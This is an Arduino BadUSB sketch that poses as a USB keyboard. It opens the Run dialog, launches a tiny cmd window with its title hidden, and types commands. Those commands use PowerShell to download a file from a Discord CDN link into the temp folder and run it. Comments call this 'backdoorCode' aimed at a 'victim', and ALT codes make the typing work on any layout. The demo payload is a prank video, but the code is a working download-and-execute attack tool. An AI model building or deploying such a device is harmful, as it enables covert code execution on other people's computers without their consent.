// Thanks https://arduino.ua/art176-pershe-znaiomstvo-z-badusb

// Import
#include <Keyboard.h>



// This means that all commands will be sent using the ALT+NUM keys.
// This method will work even if the victim's system does not have the English layout installed, but is a bit slower.
#define USE_ALT_CODES // Comment out this line if you want to disable ALT codes

// This commands will be executed
const char* backdoorCode[] = {
  "set u='https://cdn.discordapp.com/attachments/1154635152610299964/1155258532598382744/rick.mp4'",   // Set url variable
  "set f=%tmp%\\rickroll.mp4",                                                                        // Set filename variable
  "powershell -c \"Invoke-WebRequest %u% -OutFile '%f%'\" && start \"\" \"%f%\" && exit"             // Download, Execute, Exit
};

#ifdef USE_ALT_CODES
// NUM buttons 0(234)-9(233)
const char numpad[] = {
    234,
    225,
    226,
    227,
    228,
    229,
    230,
    231,
    232,
    233
};
#endif

void setup() {
  // Start keyboard communication
  Keyboard.begin();
  // This time is needed to flash our board, you can remove this, but commands will be executed immediately
  delay(5000); // 5 sec
  // Open minimized cmd window
  openHiddenCMD();
  // Doing some evil shit
  runBackdoor();
  // Done
  Keyboard.end();
}

#ifdef USE_ALT_CODES
// More info here: https://www.alt-codes.net
void printAltCode(const char c)
{
    // Break the Alt code into three digits
    char digits[] = {
        c / 100,
        (c / 10) % 10,
        c % 10
    };
    // Press ALT
    Keyboard.press(KEY_LEFT_ALT);
    delay(10);
    // Skip zeros on start
    byte i = 0;
    while (!digits[i]) {
      i++;
    }
    // Entering decimal places
    for (; i < 3; i++)
    {
        Keyboard.press(numpad[digits[i]]);
        delay(10);
        Keyboard.release(numpad[digits[i]]);
        delay(10);
    }
    // Release ALT
    Keyboard.release(KEY_LEFT_ALT);
}
#endif

void sendLine(const char s[], const bool sendEnter = true) {
  // Send line using ALT codes
  #ifdef USE_ALT_CODES
    for (int i = 0; i < strlen(s); i++) {
        printAltCode(s[i]);
    }
  // Send line using default print (Will not work if non English layout is set)
  #else
    Keyboard.print(s);
  #endif
  // Send enter if needed
  if (sendEnter) {
      Keyboard.write(KEY_RETURN);
      delay(100);
  }
}

void winPlusR() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(45);
  Keyboard.releaseAll();
  delay(60);
}

void openHiddenCMD() {
  winPlusR();
  sendLine("cmd");
  // Hide & configure console window
  const char* hiddenCmd[] = {
    "mode con: cols=15 lines=1", // Resize cmd to minimal
    "color fe",                 // Change colors
    "chcp 65001",              // Set UTF8 encoding
    "title ",                 // Hide title
  };
  // Hide & configure cmd
  int hiddenCmdLength = sizeof(hiddenCmd) / sizeof(hiddenCmd[0]);
  for (int i = 0; i < hiddenCmdLength; i++) { 
      sendLine(hiddenCmd[i]);
  }
}

// Execute all backdoor commands
void runBackdoor() {
  int backdoorCodeLength = sizeof(backdoorCode) / sizeof(backdoorCode[0]);
  for (int i = 0; i < backdoorCodeLength; i++) { 
      sendLine(backdoorCode[i]);
  }
}

// Just wait
void loop() {
    delay(1000);
}